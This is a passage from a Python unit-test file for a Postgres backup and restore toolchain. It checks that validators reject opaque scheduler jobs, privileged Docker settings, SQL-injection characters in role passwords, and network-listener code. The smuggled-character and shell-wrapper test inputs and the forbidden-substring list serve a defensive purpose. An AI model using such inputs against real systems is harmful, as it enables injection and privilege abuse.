            {**self.full_job, "argv": ["-c", "/wrapper"]},
            {**self.full_job, "on_calendar": "yearly"},
            {
                **self.full_job,
                "argv": [
                    "--config=/etc/pgbackrest/pgbackrest.conf",
                    "--stanza=adapteng-ops",
                    "--repo=1",
                    "--type=diff",
                    "backup",
                ],
            },
        ]
        for attack in attacks:
            with self.assertRaises(ExporterError):
                validate_job_policy(attack, "full")

    def test_exact_capability_inventory_passes_without_substring_inference(self) -> None:
        packet = validate_capability_inventory(
            scheduler_records=self.scheduler,
            container_records=self.containers,
            writer_process_records=self.processes,
            capability=self.capability,
        )
        self.assertEqual(packet["unclassified_capability_surfaces"], 0)

    def test_generic_nested_symlink_shell_and_docker_exec_jobs_fail(self) -> None:
        attacks = [
            {"source_type": "cron", "path": "/opt/backup-wrapper"},
            {"source_type": "cron", "chain": ["/opt/a", "/opt/b"]},
            {"source_type": "cron", "symlink": "/opt/current"},
            {"source_type": "cron", "argv": ["sh", "-c", "opaque"]},
            {"source_type": "coolify", "argv": ["docker", "exec", "opaque"]},
            {"source_type": "user-systemd-linger", "unit": "hidden.timer"},
            {"source_type": "systemd-transient", "unit": "run-u1.service"},
            {"source_type": "root-cron", "path": "/var/spool/cron/root"},
            {"source_type": "anacron", "path": "/var/spool/anacron/hidden"},
            {"source_type": "at", "path": "/var/spool/cron/atjobs/a0001"},
        ]
        for attack in attacks:
            with self.assertRaises(ExporterError):
                validate_capability_inventory(
                    scheduler_records=[*self.scheduler, attack],
                    container_records=self.containers,
                    writer_process_records=[],
                    capability=self.capability,
                )

    def test_opaque_container_and_unknown_writer_process_fail(self) -> None:
        for containers, processes in (
            ([*self.containers, {"image": "opaque", "entrypoint": None}], []),
            (self.containers, [{"uid": 123, "argv": ["unknown"]}]),
            (self.containers, [{"uids": [0, 0, 0, 0], "argv": ["root-job"]}]),
            (
                self.containers,
                [{"uids": [1002] * 4, "environment_keys": ["PGBACKREST_REPO1_KEY"]}],
            ),
            (
                self.containers,
                [{"uids": [1003] * 4, "open_fd_target_sha256s": ["a" * 64]}],
            ),
            (
                self.containers,
                [{"uids": [1004] * 4, "docker_admin_group": True}],
            ),
        ):
            with self.assertRaises(ExporterError):
                validate_capability_inventory(
                    scheduler_records=self.scheduler,
                    container_records=containers,
                    writer_process_records=processes,
                    capability=self.capability,
                )

    def test_exporter_contains_no_backup_command_substring_classifier(self) -> None:
        text = (SCRIPTS / "postgres_restore_inventory_exporter.py").read_text(
            encoding="utf-8"
        )
        self.assertNotIn("is_full_backup_surface", text)
        self.assertNotIn("validate_no_additional_full_jobs", text)

    def test_non_timer_systemd_activation_is_inventory_bound(self) -> None:
        def fake_command(arguments: list[str]) -> bytes:
            joined = " ".join(arguments)
            if "list-unit-files" in arguments:
                return b"unapproved-backup.path enabled\n"
            if "list-units" in arguments:
                return b""
            if "show" in arguments:
                return (
                    b"Id=unapproved-backup.path\n"
                    b"LoadState=loaded\nActiveState=active\n"
                    b"UnitFileState=enabled\nTransient=no\n"
                )
            raise AssertionError(joined)

        # scheduler_records() also walks absolute system roots (/etc/cron.d,
        # /usr/lib/systemd/user, /run/user/*/systemd/user, ...), so mocking
        # command_bytes alone does not isolate this test from the host it runs
        # on. Redirect those roots into an empty sandbox: on Linux the real
        # roots exist and contain symlinked units, which makes
        # scheduler_file_record fail closed before the assertions below are
        # ever reached. That is a defect in the exporter, not in this test,
        # and it is tracked in issue #18. user_unit_roots is called through
        # the run_user injection point it already exposes, not replaced.
        #
        # scheduler_file_record gets NO coverage from this test. The sandbox
        # is empty, so the walk at postgres_restore_inventory_exporter.py:644
        # never appends and the function is never called here. It is left
        # unstubbed deliberately -- so it would exercise the real path if the
        # sandbox were ever populated, and so nobody "simplifies" the code
        # under test into a stub -- but do not read that as coverage.
        # Real-path behaviour is tracked in issue #18, not asserted here.
        real_user_unit_roots = inventory_exporter.user_unit_roots

        with tempfile.TemporaryDirectory() as directory:
            sandbox = Path(directory)

            def sandboxed_path(value: str) -> Path:
                return sandbox / value.lstrip("/")

            def sandboxed_user_unit_roots(
                account_homes: set[Path],
            ) -> tuple[Path, ...]:
                return real_user_unit_roots(
                    account_homes, run_user=sandbox / "run/user"
                )

            with (
                patch.object(inventory_exporter, "command_bytes", fake_command),
                patch.object(inventory_exporter, "Path", sandboxed_path),
                patch.object(
                    inventory_exporter,
                    "user_unit_roots",
                    sandboxed_user_unit_roots,
                ),
            ):
                records = inventory_exporter.scheduler_records(
                    set(), account_homes=set()
                )
        self.assertEqual(len(records), 1)
        self.assertEqual(records[0]["source_type"], "systemd-system-unit")
        self.assertRegex(records[0]["effective_properties_sha256"], r"^[0-9a-f]{64}$")

    def test_primary_docker_gid_and_permitted_capability_are_classified(self) -> None:
        base = (
            "Uid:\t1001\t1001\t1001\t1001\n"
            "Gid:\t998\t998\t998\t998\n"
            "Groups:\t1001\n"
            "CapInh:\t0000000000000000\n"
            "CapPrm:\t0000000000000000\n"
            "CapEff:\t0000000000000000\n"
            "CapBnd:\t000001ffffffffff\n"
            "CapAmb:\t0000000000000000\n"
            "NoNewPrivs:\t0\n"
        )
        primary = process_security_state(base, writer_uid=1002, docker_gid=998)
        self.assertTrue(primary["docker_admin"])
        permitted = process_security_state(
            base.replace(
                "CapPrm:\t0000000000000000",
                "CapPrm:\t0000000000000080",
            ),
            writer_uid=1002,
            docker_gid=997,
        )
        self.assertTrue(permitted["privileged_capability"])
        aggregate = aggregate_task_security(
            [("10", primary), ("11", permitted)]
        )
        self.assertTrue(aggregate["docker_admin"])
        self.assertTrue(aggregate["privileged_capability"])
        self.assertEqual(aggregate["task_count"], 2)

    def test_bounding_set_and_no_new_privs_are_strict_and_canonically_bound(self) -> None:
        base = (
            "Uid:\t1001\t1001\t1001\t1001\n"
            "Gid:\t1001\t1001\t1001\t1001\n"
            "Groups:\t1001\n"
            "CapInh:\t0000000000000000\n"
            "CapPrm:\t0000000000000000\n"
            "CapEff:\t0000000000000000\n"
            "CapBnd:\t000001ffffffffff\n"
            "CapAmb:\t0000000000000000\n"
            "NoNewPrivs:\t0\n"
        )
        bounded = process_security_state(base, writer_uid=1002, docker_gid=998)
        self.assertFalse(bounded["privileged_capability"])
        self.assertTrue(bounded["bounded_privilege_acquisition"])
        aggregate = aggregate_task_security([("10", bounded)])
        self.assertEqual(aggregate["capability_bounding_set"], "000001ffffffffff")
        self.assertFalse(aggregate["no_new_privs"])
        self.assertTrue(aggregate["bounded_privilege_acquisition"])

        blocked = process_security_state(
            base.replace("NoNewPrivs:\t0", "NoNewPrivs:\t1"),
            writer_uid=1002,
            docker_gid=998,
        )
        self.assertFalse(blocked["bounded_privilege_acquisition"])
        no_groups = process_security_state(
            base.replace("Groups:\t1001", "Groups:\t"),
            writer_uid=1002,
            docker_gid=998,
        )
        self.assertEqual(no_groups["gids"], [1001])
        for attack in (
            base.replace("CapBnd:\t000001ffffffffff\n", ""),
            base.replace("CapBnd:\t000001ffffffffff", "CapBnd:\txyz"),
            base.replace("CapBnd:\t000001ffffffffff", "CapBnd:\t00001ffffffffff"),
            base.replace("CapBnd:\t000001ffffffffff", "CapBnd:\t000001fffffffzzzz"),
            base.replace(
                "CapBnd:\t000001ffffffffff",
                "CapBnd:\t00000000000000000",
            ),
            base.replace("NoNewPrivs:\t0\n", ""),
            base.replace("NoNewPrivs:\t0", "NoNewPrivs:\t2"),
        ):
            with self.assertRaises(ExporterError):
                process_security_state(attack, writer_uid=1002, docker_gid=998)
        with self.assertRaisesRegex(
            ExporterError, "threads disagree on privilege-acquisition state"
        ):
            aggregate_task_security([("10", bounded), ("11", blocked)])
        different_bound = process_security_state(
            base.replace(
                "CapBnd:\t000001ffffffffff",
                "CapBnd:\t0000000000000001",
            ),
            writer_uid=1002,
            docker_gid=998,
        )
        with self.assertRaisesRegex(
            ExporterError, "threads disagree on privilege-acquisition state"
        ):
            aggregate_task_security([("10", bounded), ("11", different_bound)])

        record = {
            "capability_bounding_set": aggregate["capability_bounding_set"],
            "no_new_privs": aggregate["no_new_privs"],
            "task_security_shapes": aggregate["security_shapes"],
            "executable_file_capability_sha256": None,
        }
        capability = {
            "allowed_scheduler_sources": [],
            "allowed_containers": [],
            "allowed_writer_processes": [record_sha256(record)],
        }
        packet = validate_capability_inventory(
            scheduler_records=[],
            container_records=[],
            writer_process_records=[record],
            capability=capability,
        )
        self.assertEqual(packet["writer_processes_count"], 1)
        changed = {**record, "no_new_privs": True}
        with self.assertRaises(ExporterError):
            validate_capability_inventory(
                scheduler_records=[],
                container_records=[],
                writer_process_records=[changed],
                capability=capability,
            )

    def test_capbnd_only_process_traverses_production_inventory(self) -> None:
        status = (
            "Uid:\t1001\t1001\t1001\t1001\n"
            "Gid:\t1001\t1001\t1001\t1001\n"
            "Groups:\t1001\n"
            "CapInh:\t0000000000000000\n"
            "CapPrm:\t0000000000000000\n"
            "CapEff:\t0000000000000000\n"
            "CapBnd:\t000001ffffffffff\n"
            "CapAmb:\t0000000000000000\n"
            "NoNewPrivs:\t0\n"
        )
        with tempfile.TemporaryDirectory() as temporary:
            proc = Path(temporary)
            process = proc / "100"
            task = process / "task" / "100"
            task.mkdir(parents=True)
            (task / "status").write_text(status, encoding="utf-8")
            (process / "stat").write_text(
                "100 (worker) "
                + " ".join(["S", *(["0"] * 18), "123"])
                + "\n",
                encoding="utf-8",
            )
            (process / "environ").write_bytes(b"LANG=C\x00")
            (process / "fd").mkdir()
            (process / "mountinfo").write_bytes(b"")
            (process / "cgroup").write_bytes(b"0::/worker\n")
            (process / "cmdline").write_bytes(b"/usr/bin/worker\x00")
            capability = {
                "uid": 1002,
                "docker_gid": 998,
                "credential_path": "/run/private/credential",
                "config_path": "/etc/private/config",
            }
            with (
                patch.object(
                    inventory_exporter.os,
                    "readlink",
                    return_value="/usr/bin/worker",
                ),
                patch.object(
                    inventory_exporter,
                    "canonical_executable_target",
                    return_value=Path("/usr/bin/worker"),
                ),
                patch.object(
                    inventory_exporter,
                    "descriptor_identity",
                    return_value=(b"worker", None),
                ),
            ):
                records = inventory_exporter.writer_process_records(
                    capability, proc_root=proc
                )
            def add_thread(
                _path: Path,
            ) -> tuple[bytes, None]:
                added = process / "task" / "101"
                added.mkdir()
                (added / "status").write_text(status, encoding="utf-8")
                return b"worker", None

            with (
                patch.object(
                    inventory_exporter.os,
                    "readlink",
                    return_value="/usr/bin/worker",
                ),
                patch.object(
                    inventory_exporter,
                    "canonical_executable_target",
                    return_value=Path("/usr/bin/worker"),
                ),
                patch.object(
                    inventory_exporter,
                    "descriptor_identity",
                    side_effect=add_thread,
                ),
            ):
                with self.assertRaisesRegex(
                    ExporterError, "process/thread set changed"
                ):
                    inventory_exporter.writer_process_records(
                        capability, proc_root=proc
                    )
        self.assertEqual(len(records), 1)
        self.assertEqual(records[0]["capability_bounding_set"], "000001ffffffffff")
        self.assertFalse(records[0]["no_new_privs"])
        self.assertTrue(
            records[0]["capability_reasons"][
                "bounded_privilege_acquisition_surface"
            ]
        )

    def test_container_security_identity_rejects_admin_and_binds_user(self) -> None:
        container = runner_container()
        image = image_objects()[0]
        baseline = container_capability_record(container, image)
        root_user = json.loads(json.dumps(container))
        root_user["Config"]["User"] = "0"
        self.assertNotEqual(
            record_sha256(baseline),
            record_sha256(container_capability_record(root_user, image)),
        )
        privileged = json.loads(json.dumps(container))
        privileged["HostConfig"]["Privileged"] = True
        with self.assertRaises(ExporterError):
            container_capability_record(privileged, image)

    def test_user_unit_roots_cover_account_database_homes_and_xdg_data(self) -> None:
        roots = user_unit_roots({Path("/srv/service-account")}, Path("/absent"))
        self.assertIn(
            Path("/srv/service-account/.config/systemd/user"),
            roots,
        )
        self.assertIn(
            Path("/srv/service-account/.local/share/systemd/user"),
            roots,
        )
        self.assertIn(
            Path("/srv/service-account/.config/systemd/user-generators"),
            roots,
        )

    def test_closed_host_scope_and_all_uid_capability_sources_are_explicit(self) -> None:
        source = (SCRIPTS / "postgres_restore_inventory_exporter.py").read_text(
            encoding="utf-8"
        )
        for required in (
            "/var/lib/systemd/linger",
            "/run/user",
            "list-unit-files",
            '"--all"',
            "/var/spool/anacron",
            "/var/spool/at",
            "/etc/systemd/user",
            ".local/share/systemd/user",
            "/usr/local/share/systemd/user",
            "/etc/xdg/systemd/user",
            "task_security_inventory_sha256",
            "mountinfo",
            "open_fd_target_sha256s",
            "docker_admin_group",
            "shared Coolify scheduler scope is unsupported",
        ):
            self.assertIn(required, source)

    def test_deleted_and_memfd_writer_executables_fail_closed(self) -> None:
        for value in (
            "/usr/bin/pgbackrest (deleted)",
            "/memfd:opaque (deleted)",
            "relative-executable",
        ):
            with self.assertRaises(ExporterError):
                canonical_executable_target(value)

    def test_exact_retention_policy_and_effective_fragment_are_required(self) -> None:
        valid = b"""[global]
repo1-retention-full=12
repo1-retention-full-type=count
"""
        self.assertEqual(retention_policy(valid), (12, "count"))
        with self.assertRaises(ExporterError):
            retention_policy(valid.replace(b"12", b"8"))
        validate_effective_unit_properties(
            "FragmentPath=/etc/systemd/system/example.timer\nDropInPaths=\n",
            Path("/etc/systemd/system/example.timer"),
        )
        with self.assertRaises(ExporterError):
            validate_effective_unit_properties(
                "FragmentPath=/etc/systemd/system/example.timer\n"
                "DropInPaths=/etc/systemd/system/example.timer.d/override.conf\n",
                Path("/etc/systemd/system/example.timer"),
            )


class RetentionBindingTests(unittest.TestCase):
    def setUp(self) -> None:
        self.now = datetime(2026, 7, 31, 8, 0, tzinfo=timezone.utc)
        self.schedule = [
            self.now + timedelta(days=7 * index) for index in range(1, 13)
        ]
        self.current = {
            "selected_set_ref_sha256": "1" * 64,
            "selected_set_info_sha256": "2" * 64,
            "completed_at": "2026-07-31T07:00:00Z",
            "scheduler_inventory_sha256": "3" * 64,
            "scheduler_inventory_observed_at": "2026-07-31T08:00:00Z",
            "repository_inventory_sha256": "4" * 64,
            "retention_valid_until": "2026-10-22T07:59:59Z",
            "repository_write_capability_sha256": "6" * 64,
            "capability_inventory_sha256": "7" * 64,
            "full_job_identity_sha256": "8" * 64,
            "differential_job_identity_sha256": "9" * 64,
        }
        self.accepted = {
            **self.current,
            "packet_kind": "ACCEPTED_RETENTION",
            "inventory_exporter_manifest_sha256": "5" * 64,
            "weekly_cadence_seconds": 604800,
            "weekly_slot_count": 12,
        }

    def test_exact_weekly_schedule_is_required(self) -> None:
        validate_weekly_schedule(self.schedule, self.now)
        irregular = list(self.schedule)
        irregular[5] += timedelta(hours=1)
        with self.assertRaises(RetentionError):
            validate_weekly_schedule(irregular, self.now)

    def test_exporter_derives_next_twelve_weekly_slots(self) -> None:
        slots = next_weekly_slots(self.now)
        self.assertEqual(len(slots), 12)
        validate_weekly_schedule(slots, self.now)

    def test_annual_and_duplicate_schedules_are_rejected(self) -> None:
        annual = [
            self.now + timedelta(days=365 * index) for index in range(1, 13)
        ]
        with self.assertRaises(RetentionError):
            validate_weekly_schedule(annual, self.now)
        duplicate = list(self.schedule)
        duplicate[-1] = duplicate[-2]
        with self.assertRaises(RetentionError):
            validate_weekly_schedule(duplicate, self.now)

    def test_authorization_requires_accepted_capability_and_current_binding(self) -> None:
        validate_accepted_binding(
            self.accepted,
            self.current,
            accepted_scheduler_sha256="3" * 64,
            accepted_repository_sha256="4" * 64,
            exporter_manifest_sha256="5" * 64,
        )
        for field in (
            "scheduler_inventory_sha256",
            "repository_write_capability_sha256",
            "capability_inventory_sha256",
            "full_job_identity_sha256",
            "differential_job_identity_sha256",
        ):
            substituted = {**self.accepted, field: "0" * 64}
            with self.assertRaises(RetentionError):
                validate_accepted_binding(
                    substituted,
                    self.current,
                    accepted_scheduler_sha256="3" * 64,
                    accepted_repository_sha256="4" * 64,
                    exporter_manifest_sha256="5" * 64,
                )

    def test_restore_wrapper_rejects_free_form_acceptance_packet(self) -> None:
        with self.assertRaises(GenerationError):
            validate_restore_acceptance(
                self.accepted,
                selected_set="20260731-080000F",
                selected_info_sha256="2" * 64,
                exporter_manifest_sha256="5" * 64,
            )

    def test_accepted_packet_hash_and_canonical_bytes_are_required(self) -> None:
        raw = canonical_json(self.accepted)
        value, loaded = parse_canonical_packet(
            raw, sha256_bytes(raw), "accepted packet"
        )
        self.assertEqual(value, self.accepted)
        self.assertEqual(loaded, raw)
        noncanonical = b'{ "packet_kind": "ACCEPTED_RETENTION" }\n'
        with self.assertRaises(RetentionError):
            parse_canonical_packet(noncanonical, sha256_bytes(noncanonical), "packet")

    def test_consumer_output_is_exactly_five_sanitized_fields(self) -> None:
        fields = sanitized_consumer_fields(self.current)
        self.assertEqual(
            set(fields),
            {
                "completed_at",
                "selected_set_info_sha256",
                "scheduler_inventory_sha256",
                "scheduler_inventory_observed_at",
                "retention_valid_until",
            },
        )


class FinalBoundaryAttackTests(unittest.TestCase):
    def test_role_password_injection_alphabet_is_closed(self) -> None:
        for attack in (
            "A" * 47 + "'",
            "A" * 47 + "\\",
            "A" * 47 + ";",
            "A" * 47 + "\n",
            "A" * 47 + "é",
            "A" * 129,
            "A" * 47,
        ):
            with self.assertRaises(RunnerError):
                role_lifecycle_sql("bootstrap-role", attack)
        sql = role_lifecycle_sql("bootstrap-role", "A" * 48)
        self.assertEqual(sql.count(b"CREATE ROLE"), 1)
        self.assertEqual(sql.count(b";"), 2)
        self.assertNotIn(b"--", sql)
        source = (SCRIPTS / "postgres_restore_runner.py").read_text(encoding="utf-8")
        self.assertEqual(source.count("os.open(\n        DATABASE_SECRET,"), 1)
        self.assertNotIn("secure_member_bytes(\n                    DATABASE_SECRET", source)

    def test_complete_docker_security_shape_is_shared_and_bound(self) -> None:
        baseline = runner_container()
        image = image_objects()[0]
        original = container_execution_identity(baseline)
        rejected = (
            ("HostConfig", "DeviceCgroupRules", ["a *:* rwm"]),
            ("HostConfig", "StorageOpt", {"size": "100G"}),
            ("HostConfig", "Annotations", {"attacker": "true"}),
            ("HostConfig", "Devices", [{"PathOnHost": "/dev/sda"}]),
            ("HostConfig", "DeviceRequests", [{"Count": -1}]),
            ("HostConfig", "Isolation", "hyperv"),
            ("HostConfig", "FutureSecurityMode", "unsafe"),
            ("Config", "Annotations", {"attacker": "true"}),
        )
        for section, field, value in rejected:
            attack = json.loads(json.dumps(baseline))
            attack[section][field] = value
            with self.subTest(field=field):
                with self.assertRaises(HostInventoryError):
                    container_execution_identity(attack)
                with self.assertRaises(ExporterError):
                    container_capability_record(attack, image)
        for field in ("MaskedPaths", "ReadonlyPaths"):
            attack = json.loads(json.dumps(baseline))
            attack["HostConfig"][field].append("/proc/attacker")
            self.assertNotEqual(container_execution_identity(attack), original)

    def test_provider_broker_has_one_shot_nonselectable_target_shape(self) -> None:
        source = (SCRIPTS / "postgres_restore_provider_inventory.py").read_text(
            encoding="utf-8"
        )
        for forbidden in ("import socket", ".bind(", ".listen(", ".accept(", "serve_broker"):
            self.assertNotIn(forbidden, source)
        request_fields = source[source.index("required = {", source.index("def broker_response")) :]
        self.assertNotIn('"server_id",', request_fields.split("}", 1)[0])
        self.assertIn("pinned_config", source)
        self.assertIn("read_capability_fd", source)
        self.assertIn("def supervise_broker(", source)
        self.assertIn('"broker-once"', source)
        self.assertIn("request_fd = memfd(", source)
        self.assertIn("response_fd = memfd(", source)
        generation = (SCRIPTS / "postgres_restore_generation.py").read_text(
            encoding="utf-8"
        )
        self.assertIn(
            "pass_fds=(PROVIDER_BROKER_REQUEST_FD, PROVIDER_BROKER_RESPONSE_FD)",
            generation,
        )


class GitObjectSealTests(unittest.TestCase):
    def test_index_commit_and_autocrlf_use_identical_git_blob_bytes(self) -> None:
        tool = SCRIPTS / "postgres_restore_git_seal.py"
        with tempfile.TemporaryDirectory() as temporary:
            repository = Path(temporary)
            subprocess.run(["git", "init", "-q"], cwd=repository, check=True)
            subprocess.run(
                ["git", "config", "user.email", "seal@example.invalid"],
                cwd=repository,
                check=True,
            )
            subprocess.run(
                ["git", "config", "user.name", "Seal Test"],
                cwd=repository,
                check=True,
            )
            for index, member in enumerate(MEMBERS):
                path = repository / member
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_bytes(f"member-{index}\n".encode("ascii"))
            (repository / ".gitattributes").write_text(
                "scripts/postgres_restore_* text eol=lf\n", encoding="ascii"
            )
            subprocess.run(
                ["git", "add", ".gitattributes", *MEMBERS],
                cwd=repository,
                check=True,
            )
            manifest = subprocess.run(
                [sys.executable, str(tool), "build-index"],
                cwd=repository,
                check=True,
                capture_output=True,
            ).stdout
            manifest_path = repository / "scripts/postgres_restore_procedure_manifest.json"
            manifest_path.write_bytes(manifest)
            subprocess.run(["git", "add", str(manifest_path)], cwd=repository, check=True)
            subprocess.run(["git", "commit", "-qm", "sealed"], cwd=repository, check=True)
            reports = []
            for value in ("true", "false"):
                subprocess.run(
                    ["git", "config", "core.autocrlf", value],
                    cwd=repository,
                    check=True,
                )
                reports.append(
                    subprocess.run(
                        [sys.executable, str(tool), "verify-ref", "HEAD"],
                        cwd=repository,
                        check=True,
                        capture_output=True,
                    ).stdout
                )
            self.assertEqual(reports[0], reports[1])

    def test_crlf_cr_and_nul_are_never_normalized(self) -> None:
        for payload in (b"x\r\n", b"x\ry\n", b"x\0y\n"):
            with self.assertRaises(SealError):
                validate_member(
                    "scripts/postgres_restore_guard.py", "100644", "0" * 40, payload
                )
            with self.assertRaises(RunnerError):
                sealed_text_git_oid(payload, "member")


class ReadinessAndManifestTests(unittest.TestCase):
    def test_literal_not_ready_enum_is_on_all_status_surfaces(self) -> None:
        enum = "NOT_READY_PENDING_AUTOMATION_EVIDENCE_LIFECYCLE_PR"
        paths = (
            ROOT / "ARCHITECTURE.md",
            ROOT / "owner/action-items.md",
            ROOT / "runbooks/backup-and-restore.md",
            ROOT / "registry/data-stores.yaml",
            ROOT / "registry/services.yaml",
        )
        for path in paths:
            self.assertIn(enum, path.read_text(encoding="utf-8"), str(path))

    def test_new_isolation_members_are_in_procedure_manifest(self) -> None:
        manifest = json.loads(
            (SCRIPTS / "postgres_restore_procedure_manifest.json").read_text(
                encoding="utf-8"
            )
        )
        for member in (
            "scripts/postgres_restore_host_inventory.py",
            "scripts/postgres_restore_isolation_gate.py",
        ):
            self.assertIn(member, manifest["artifacts"])


if __name__ == "__main__":
    unittest.main()
